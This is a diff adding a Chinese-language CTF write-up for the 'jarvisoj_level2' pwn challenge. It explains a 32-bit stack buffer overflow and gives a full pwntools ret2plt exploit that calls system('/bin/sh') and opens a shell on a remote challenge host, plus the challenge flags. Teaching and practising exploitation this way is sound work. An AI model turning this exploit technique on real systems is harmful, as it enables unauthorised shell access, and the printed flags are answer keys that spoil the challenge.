@@ -607,3 +607,92 @@ if __name__ == "__main__":
 ## Flag
 
 Flag: `flag{a375d1c7-b6dc-4b93-bb5e-9ba59d14060a}`
+
+# jarvisoj_level2
+
+## Information
+
+- Category: Pwn
+- Points: 1
+
+## Write-up
+
+```c del={6}
+ssize_t vulnerable_function()
+{
+  _BYTE buf[136]; // [esp+0h] [ebp-88h] BYREF
+
+  system("echo Input:");
+  return read(0, buf, 256u);
+}
+```
+
+观察上面程序，`read` 可以溢出破坏返回地址。由于这是 32-bit 程序，函数参数通过栈来传递，所以我们可以覆盖返回地址为 `system@plt`，然后在栈上写传给 `system` 的参数。
+
+我们希望拿 `shell`，直接 IDA `Shift + F12` 看程序包含的字符串，发现有 `.data:0804A024 hint db '/bin/sh',0`，那么参数问题就解决了，因为没开 PIE，直接就是固定地址。
+
+需要注意的是，如果你返回到 `call system@plt` 这样的内部指令，由于 `call` 指令会自动将下一条指令的地址压入栈中，作为函数调用结束后的返回地址，所以你可以直接在它之后写要传入的参数；而如果选择返回到 `system@plt`，那就需要手动提供一个地址作为函数调用结束后的返回地址，之后才是跟着函数的参数。
+
+即，`call` 指令可以分解为 `push eip_next; jmp <entry>`，而返回到 `system@plt` 相当于直接 `jmp system@plt`，没有设置返回地址。
+
+## Exploit
+
+```python
+#!/usr/bin/python
+
+from pwn import args, context, flat, gdb, process, remote
+
+gdbscript = """
+set follow-fork-mode parent
+b *vulnerable_function+42
+b *vulnerable_function+52
+c
+"""
+
+FILE = "./level2"
+HOST, PORT = "node5.buuoj.cn", 25976
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+
+def launch():
+    if args.L:
+        target = process(FILE)
+    else:
+        target = remote(HOST, PORT)
+
+    if args.D:
+        gdb.attach(target, gdbscript=gdbscript)
+
+    return target
+
+
+def construct_payload():
+    elf = context.binary
+
+    payload = flat(
+        b"A" * 0x8C,
+        elf.plt["system"],
+        0x0,  # return address placeholder
+        next(elf.search(b"/bin/sh")),
+    )
+
+    return payload
+
+
+def main():
+    target = launch()
+
+    payload = construct_payload()
+
+    target.sendline(payload)
+    target.interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+## Flag
+
+Flag: `flag{b3e65f27-e5ed-4763-a83b-d582ac37b3ea}`
